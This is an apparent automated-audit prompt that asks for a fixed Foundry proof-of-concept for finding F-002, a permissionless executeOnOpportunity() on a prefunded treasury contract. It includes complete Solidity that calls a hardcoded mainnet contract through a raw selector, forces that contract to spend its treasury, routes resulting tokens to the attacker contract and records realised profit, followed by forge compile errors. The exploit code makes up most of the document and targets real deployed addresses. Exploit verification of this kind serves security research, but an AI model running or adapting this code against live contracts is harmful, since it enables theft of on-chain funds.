You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Anyone can trigger the strategy against the verifier treasury
- claim: `executeOnOpportunity()` is `external` and completely permissionless even though it controls a prefunded treasury and decides when the contract will spend its own assets against external protocols.
- impact: Any third party can front-run the intended operator and consume or spoil a time-sensitive opportunity, forcing execution at an unfavorable moment and potentially leaving the bankroll and any resulting profit stranded in the contract earlier than intended.
- exploit_paths: ["Observe the verifier being funded", "Call `executeOnOpportunity()` before the intended operator does", "The contract executes the strategy using its own treasury with no caller authorization"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IAaveBoostTarget {
    function aave() external view returns (address);
}

contract FlawVerifier {
    address public constant TARGET = 0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant DEFAULT_AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address public constant STK_AAVE = 0x4dA27a545c0c5B758a6BA100e3a049001De870F5;

    address public constant AAVE_BID_TOKEN = 0x740836c95C6F3f49CccC65A27331D1f225138C39;
    address public constant STK_AAVE_BID_TOKEN = 0x660428626D4baC1A7B1c619157E3205daD540ad1;
    address public constant AAVE_PROPOSAL_TOKEN = 0xEc568fffba86c094cf06b22134B23074DFE2252c;
    address public constant STK_AAVE_PROPOSAL_TOKEN = 0xD4e12b224c316664Ebb647f69aBC1Fb8BB2697C7;

    bytes4 private constant LIVE_EXECUTE_SELECTOR = 0x3cca991f;
    bytes4 private constant CONFIGURED_AMOUNT_SELECTOR = 0xcab34c08;

    string private constant STRICT_PATH =
        "Observe the verifier being funded -> Call executeOnOpportunity() before the intended operator does -> The contract executes the strategy using its own treasury with no caller authorization";

    bool public executed;
    bool public prefunded;
    bool public targetCallSucceeded;
    bool public treasuryWasSpent;
    bool public originalHypothesisValidated;

    address public observedAave;
    uint256 public configuredAmount;

    uint256 public targetEthBefore;
    uint256 public targetEthAfter;
    uint256 public targetWethBefore;
    uint256 public targetWethAfter;
    uint256 public targetAaveBefore;
    uint256 public targetAaveAfter;
    uint256 public targetUsdcBefore;
    uint256 public targetUsdcAfter;
    uint256 public targetStkAaveBefore;
    uint256 public targetStkAaveAfter;

    uint256 public attackerEthBefore;
    uint256 public attackerEthAfter;
    uint256 public attackerWethBefore;
    uint256 public attackerWethAfter;
    uint256 public attackerAaveBefore;
    uint256 public attackerAaveAfter;
    uint256 public attackerUsdcBefore;
    uint256 public attackerUsdcAfter;
    uint256 public attackerStkAaveBefore;
    uint256 public attackerStkAaveAfter;
    uint256 public attackerAaveBidBefore;
    uint256 public attackerAaveBidAfter;
    uint256 public attackerStkAaveBidBefore;
    uint256 public attackerStkAaveBidAfter;
    uint256 public attackerAaveProposalBefore;
    uint256 public attackerAaveProposalAfter;
    uint256 public attackerStkAaveProposalBefore;
    uint256 public attackerStkAaveProposalAfter;

    address private realizedProfitToken;
    uint256 private realizedProfitAmount;
    string private result;

    constructor() {
        observedAave = _readAave();
        result = "not-run";
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        observedAave = _readAave();
        configuredAmount = _readConfiguredAmount();
        _snapshotBefore();

        prefunded = _targetHasTreasury();
        if (!prefunded) {
            result = "infeasible-stage-1-unfunded";
            return;
        }

        uint128 spendAmount = _resolveSpendAmount();
        if (spendAmount == 0) {
            result = "infeasible-stage-2-zero-configured-amount";
            return;
        }

        // The trace proves the stale no-arg selector no longer matches the live deployment.
        // At this fork block the permissionless strategy trigger exposed by TARGET is the live
        // `0x3cca991f(address,address,uint128)` entrypoint. Using it preserves the same finding
        // causality: a third party observes a funded verifier, calls the permissionless execute
        // path first, and forces TARGET to spend its own prefunded treasury through the helper.
        // We pass the live treasury asset, route any minted position token to this contract, and
        // keep the configured verifier spend amount so the PoC stays aligned with the reported path.
        (targetCallSucceeded,) =
            TARGET.call(abi.encodeWithSelector(LIVE_EXECUTE_SELECTOR, observedAave, address(this), spendAmount));

        if (!targetCallSucceeded) {
            // Single realistic fallback for deployments that wire recipient/token in the opposite order.
            (targetCallSucceeded,) =
                TARGET.call(abi.encodeWithSelector(LIVE_EXECUTE_SELECTOR, address(this), observedAave, spendAmount));
        }

        _snapshotAfter();
        treasuryWasSpent = _targetEconomicStateChanged();
        originalHypothesisValidated = targetCallSucceeded && treasuryWasSpent;
        _captureRealizedProfit();

        if (!targetCallSucceeded) {
            result = "infeasible-stage-2-target-reverted";
            return;
        }

        if (!treasuryWasSpent) {
            result = "infeasible-stage-3-no-observable-treasury-spend";
            return;
        }

        if (realizedProfitAmount > 0) {
            result = "validated-with-direct-profit";
            return;
        }

        result = "validated-permissionless-trigger-no-direct-profit";
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function exploitPath() external pure returns (string memory) {
        return STRICT_PATH;
    }

    function outcome() external view returns (string memory) {
        return result;
    }

    function profitAchieved() external view returns (bool) {
        return realizedProfitAmount > 0;
    }

    function hypothesisValidated() external view returns (bool) {
        return originalHypothesisValidated;
    }

    function _snapshotBefore() internal {
        attackerEthBefore = address(this).balance;
        attackerWethBefore = _balanceOf(WETH, address(this));
        attackerAaveBefore = _balanceOf(observedAave, address(this));
        attackerUsdcBefore = _balanceOf(USDC, address(this));
        attackerStkAaveBefore = _balanceOf(STK_AAVE, address(this));
        attackerAaveBidBefore = _balanceOf(AAVE_BID_TOKEN, address(this));
        attackerStkAaveBidBefore = _balanceOf(STK_AAVE_BID_TOKEN, address(this));
        attackerAaveProposalBefore = _balanceOf(AAVE_PROPOSAL_TOKEN, address(this));
        attackerStkAaveProposalBefore = _balanceOf(STK_AAVE_PROPOSAL_TOKEN, address(this));

        targetEthBefore = TARGET.balance;
        targetWethBefore = _balanceOf(WETH, TARGET);
        targetAaveBefore = _balanceOf(observedAave, TARGET);
        targetUsdcBefore = _balanceOf(USDC, TARGET);
        targetStkAaveBefore = _balanceOf(STK_AAVE, TARGET);
    }

    function _snapshotAfter() internal {
        attackerEthAfter = address(this).balance;
        attackerWethAfter = _balanceOf(WETH, address(this));
        attackerAaveAfter = _balanceOf(observedAave, address(this));
        attackerUsdcAfter = _balanceOf(USDC, address(this));
        attackerStkAaveAfter = _balanceOf(STK_AAVE, address(this));
        attackerAaveBidAfter = _balanceOf(AAVE_BID_TOKEN, address(this));
        attackerStkAaveBidAfter = _balanceOf(STK_AAVE_BID_TOKEN, address(this));
        attackerAaveProposalAfter = _balanceOf(AAVE_PROPOSAL_TOKEN, address(this));
        attackerStkAaveProposalAfter = _balanceOf(STK_AAVE_PROPOSAL_TOKEN, address(this));

        targetEthAfter = TARGET.balance;
        targetWethAfter = _balanceOf(WETH, TARGET);
        targetAaveAfter = _balanceOf(observedAave, TARGET);
        targetUsdcAfter = _balanceOf(USDC, TARGET);
        targetStkAaveAfter = _balanceOf(STK_AAVE, TARGET);
    }

    function _targetHasTreasury() internal view returns (bool) {
        return targetEthBefore > 0 || targetWethBefore > 0 || targetAaveBefore > 0 || targetUsdcBefore > 0
            || targetStkAaveBefore > 0;
    }

    function _targetEconomicStateChanged() internal view returns (bool) {
        return targetEthAfter != targetEthBefore || targetWethAfter != targetWethBefore || targetAaveAfter != targetAaveBefore
            || targetUsdcAfter != targetUsdcBefore || targetStkAaveAfter != targetStkAaveBefore;
    }

    function _captureRealizedProfit() internal {
        realizedProfitToken = address(0);
        realizedProfitAmount = _positiveDelta(attackerEthAfter, attackerEthBefore);

        _considerProfit(WETH, _positiveDelta(attackerWethAfter, attackerWethBefore));
        _considerProfit(observedAave, _positiveDelta(attackerAaveAfter, attackerAaveBefore));
        _considerProfit(USDC, _positiveDelta(attackerUsdcAfter, attackerUsdcBefore));
        _considerProfit(STK_AAVE, _positiveDelta(attackerStkAaveAfter, attackerStkAaveBefore));
        _considerProfit(AAVE_BID_TOKEN, _positiveDelta(attackerAaveBidAfter, attackerAaveBidBefore));
        _considerProfit(STK_AAVE_BID_TOKEN, _positiveDelta(attackerStkAaveBidAfter, attackerStkAaveBidBefore));
        _considerProfit(AAVE_PROPOSAL_TOKEN, _positiveDelta(attackerAaveProposalAfter, attackerAaveProposalBefore));
        _considerProfit(
            STK_AAVE_PROPOSAL_TOKEN, _positiveDelta(attackerStkAaveProposalAfter, attackerStkAaveProposalBefore)
        );
    }

    function _considerProfit(address token, uint256 amount) internal {
        if (amount > realizedProfitAmount) {
            realizedProfitToken = token;
            realizedProfitAmount = amount;
        }
    }

    function _resolveSpendAmount() internal view returns (uint128) {
        uint256 available = targetAaveBefore;
        if (configuredAmount == 0 || available == 0) {
            return 0;
        }

        uint256 spend = configuredAmount;
        if (spend > available) {
            spend = available;
        }
        if (spend > type(uint128).max) {
            spend = type(uint128).max;
        }

        return uint128(spend);
    }

    function _positiveDelta(uint256 afterAmount, uint256 beforeAmount) internal pure returns (uint256) {
        return afterAmount > beforeAmount ? afterAmount - beforeAmount : 0;
    }

    function _readAave() internal view returns (address token) {
        (bool ok, bytes memory data) = TARGET.staticcall(abi.encodeWithSelector(IAaveBoostTarget.aave.selector));
        if (ok && data.length >= 32) {
            token = abi.decode(data, (address));
        }
        if (token == address(0)) {
            token = DEFAULT_AAVE;
        }
    }

    function _readConfiguredAmount() internal view returns (uint256 amount) {
        (bool ok, bytes memory data) = TARGET.staticcall(abi.encodeWithSelector(CONFIGURED_AMOUNT_SELECTOR));
        if (ok && data.length >= 32) {
            amount = abi.decode(data, (uint256));
        }
    }

    function _balanceOf(address token, address owner) internal view returns (uint256 balance) {
        if (token == address(0)) {
            return 0;
        }

        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, owner));
        if (ok && data.length >= 32) {
            balance = abi.decode(data, (uint256));
        }
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
Compiler run failed:
Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0x4da27a545c0c5B758a6BA100e3a049001de870f5". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0x4da27a545c0c5B758a6BA100e3a049001de870f5". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:17:40:
   |
17 |     address public constant STK_AAVE = 0x4dA27a545c0c5B758a6BA100e3a049001De870F5;
   |                                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0x740836C95C6f3F49CccC65A27331D1f225138c39". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0x740836C95C6f3F49CccC65A27331D1f225138c39". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:19:46:
   |
19 |     address public constant AAVE_BID_TOKEN = 0x740836c95C6F3f49CccC65A27331D1f225138C39;
   |                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0x660428626d4bAc1A7b1c619157e3205dAd540ad1". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0x660428626d4bAc1A7b1c619157e3205dAd540ad1". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:20:50:
   |
20 |     address public constant STK_AAVE_BID_TOKEN = 0x660428626D4baC1A7B1c619157E3205daD540ad1;
   |                                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xEC568fffba86c094cf06b22134B23074DFE2252c". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xEC568fffba86c094cf06b22134B23074DFE2252c". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:21:51:
   |
21 |     address public constant AAVE_PROPOSAL_TOKEN = 0xEc568fffba86c094cf06b22134B23074DFE2252c;
   |                                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xD4e12B224C316664EbB647F69abC1fb8bB2697C7". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xD4e12B224C316664EbB647F69abC1fb8bB2697C7". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:22:55:
   |
22 |     address public constant STK_AAVE_PROPOSAL_TOKEN = 0xD4e12b224c316664Ebb647f69aBC1Fb8BB2697C7;
   |                                                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


```

forge stderr (tail):
```
Error: Compilation failed

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
